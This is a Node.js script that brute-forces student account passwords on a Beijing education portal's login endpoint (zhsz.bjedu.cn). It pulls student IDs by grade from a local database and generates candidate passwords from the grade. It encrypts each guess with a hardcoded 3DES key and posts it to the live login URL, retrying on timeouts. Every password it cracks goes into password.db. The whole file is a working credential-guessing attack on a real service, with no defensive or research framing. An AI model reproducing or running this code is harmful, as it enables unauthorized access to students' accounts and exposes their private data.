var sqlite3 = require("sqlite3").verbose();
var request = require("request");
var urlencode = require("urlencode");
var cluster = require("cluster");
var lib = require("./lib");
let print = (s) =>{
	console.log(s)
}

const argv=process.argv

function sub(idName,idPassword,resolve,reject){
        var key = "rEybhlpaq09236H@fg712}3[";//文档中的key为32进制"ckV5YmhscGFxMDkyMzZIQGZnNzEyfTNb"
        username = idName;
		uid = idName;
        idName = lib.DES3.encrypt(key,idName);
		passwd = idPassword;
        idPassword = lib.DES3.encrypt(key,idPassword);
		request({
            url: "http://zhsz.bjedu.cn/web/login/validate",
            method: 'POST',
			timeout:3000,
            body:urlencode.stringify({'user':idName,'pass':idPassword,'save':0,sign:lib.btoa(username)}),
			headers: {
				"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			}
		},
		function (e,r,b) {
			if(e){
				reject(e)
			}else{
				var bb=JSON.parse(b);
				if(bb.message.search("高中")+1){
					resolve(passwd);
				}else{
					reject("用户密码错误"+passwd);
				}
			}
			
        });
}

function req(uid,passwd){
	return new Promise(
		(resolve,reject)=>{
			sub(uid,passwd,resolve,reject)
		}
	);
}


function getAllUid(grade){
	return new Promise((resolve,reject)=>{
		db = new sqlite3.Database("student.db");
		db.all("select id from Student where grade=?",grade,(err,row)=>{
			//console.log(row)
			if(err){
				reject(err)
			}else{
				var a=[]
				for(i in row){a.push(row[i].id)}
				resolve(a)
			}
		})
	})
}

function getWorkedUid(){
	return new Promise((resolve,reject)=>{
		db = new sqlite3.Database("password.db");
		db.all("select id from Password",(err,row)=>{
			//console.log(row)
			if(err){
				reject(err)
			}else{
				var a=[]
				for(i in row){a.push(row[i].id)}
				resolve(a)
			}
		})
	})
}

function updateDb(uid,passwd){
	return new Promise((resolve,reject)=>{
		db = new sqlite3.Database("password.db")
		db.all("insert into Password VALUES(?,?)",uid,passwd,(err,row)=>{
			if(err){
				reject(err)
			}else{
				resolve(false)
			}
		});
	});
}

async function getWorks(){
	const all = await getAllUid(argv[2]);
	const worked = await getWorkedUid()
	return all.filter(i => !worked.includes(i))
}

async function getBlankPasswd(){
	return new Promise((resolve,reject)=>{
		db = new sqlite3.Database("password.db")
		db.all("select id from Password where passwd=\"\"",(err,row)=>{
			if(err){
				reject(err)
			}else{
				resolve(row)
			}
		});
	}); 
}

async function updateCorrect(uid,passwd){
	return new Promise((resolve,reject)=>{
		db = new sqlite3.Database("password.db")
		db.all("update Password set passwd = ? where id = ?",passwd,uid,(err,row)=>{
			if(err){
				reject(err)
			}else{
				resolve(false)
			}
		});
	});
}

async function main(){
	var l=lib.passwdGen(Number(argv[2])-19,Number(argv[2])-18)
	//l.filter(i=>print(i))
	var works = await getWorks()
	for(uidIndex in works)
	{
		uid = works[uidIndex]
		var status=0;//0 未查到密码 1 查到密码 2 timeout
		for(var i in l){
			i=l[i];
			if(status == 0){
				do{
					status = 0;
					await req(uid,i)
					.then((val)=>{
						console.log(val);
						updateDb(uid,val)
						status = 1;
					})
					.catch((err)=>{
						console.log(uid,err);
						if(!(new String(err)).includes("密码错误")){
							status = 2;
						}
					});
				}while(status == 2)		
			}
		}
		if(status == 0){
			updateDb(uid,"未搜到");
		}
	}
	
	return 0;
}

async function correct(){
	var l=lib.passwdGen(Number(argv[2])-19,Number(argv[2])-18)
	var bpl = await getBlankPasswd();
	
	for(index in bpl){
		uid = bpl[index]["id"]
		
		var status=0;//0 未查到密码 1 查到密码 2 timeout
		for(var i in l){
			i=l[i];
			if(status == 0){
				do{
					await req(uid,i)
					.then((val)=>{
						console.log(val);
						updateCorrect(uid,val)
						status = 1;
					})
					.catch((err)=>{
						console.log(uid,err);
						if(!(new String(err)).includes("密码错误")){
							status = 2;
						}
					});
				}while(status == 2)		
			}
		}
		if(status == 0){
			updateCorrect(uid,"未搜到");
		}
		
	}
}

/*
var cpus = require("os").cpus()
if(cluster.isMaster){
	for(i in cpus){
		cluster.fork()
	}
	
}else if(cluster.isWorker){
	print(getAlluid())
}
*/
main()
//correct()
